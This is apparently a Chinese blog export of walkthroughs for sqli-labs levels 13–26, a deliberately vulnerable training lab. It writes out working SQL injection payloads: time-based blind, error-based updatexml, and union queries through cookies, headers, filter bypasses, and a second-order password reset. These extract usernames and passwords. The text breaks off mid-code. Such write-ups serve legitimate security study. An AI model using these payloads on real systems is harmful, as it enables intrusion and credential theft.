    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
<p>构造成功，然后使用时间盲注</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
<p>以此类推</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_17</title>
    <url>/2022/11/11/sqli-labs_17/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li>
</ol>
<ul>
<li><code>substr($value,0,15)</code>截断到15位</li>
<li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li>
<li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li>
</ul>
<ol start="2">
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>本关的重点在于找到注入方式，如何去通过报错注入获取所需信息。技术上仍然还是那些。也可参见第二篇致谢的其它报错函数注入。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://cloud.tencent.com/developer/article/1906116">全网最全sqli-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_18</title>
    <url>/2022/11/15/sqli-labs_18/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在这一关的时候出了bug，没有报错。查了半天原因，最终猜测是数据库版本的问题，让人实在难受，最终只得重新删除sqli-labs再次下载。在这里郑重警示自己，不要使用MySQL5.7.26及以上的数据库。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
<p>因此我们可以从user-agent处注入。</p>
</li>
<li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p>
</li>
</ol>
<p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p>
<p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p>
<ol start="3">
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从本关开始，不再局限于提交方式了</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_19</title>
    <url>/2022/11/15/sqli-labs_19/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_21+22</title>
    <url>/2022/11/15/sqli-labs_21+22/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关开始用到加解密了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第22关"><a href="#第22关" class="headerlink" title="第22关"></a>第22关</h2><p>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只要判断出是那种加密方式，接下来的步骤就简单了。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_20</title>
    <url>/2022/11/15/sqli-labs_20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
<p>报错，说明字段数为3</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若问我为什么知道这么做，我只能说，在网上看来的。( ╯□╰ )</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_23</title>
    <url>/2022/11/16/sqli-labs_23/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再次回归GET注入，只是已有变化了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>采用URL终止符<code>%00</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是把注入方式搞清楚，构造语句和原来差不多</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_24</title>
    <url>/2022/11/17/sqli-labs_24/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</li>
<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>二次注入的简单实践。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://blog.csdn.net/qq_42266432/article/details/120072927">sqli-labs第二十四关(二阶注入)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_25+25a</title>
    <url>/2022/11/17/sqli-labs_25+25a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
</ol>
<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_26+26a</title>
    <url>/2022/11/17/sqli-labs_26+26a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相当于前一关的加强版？</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span 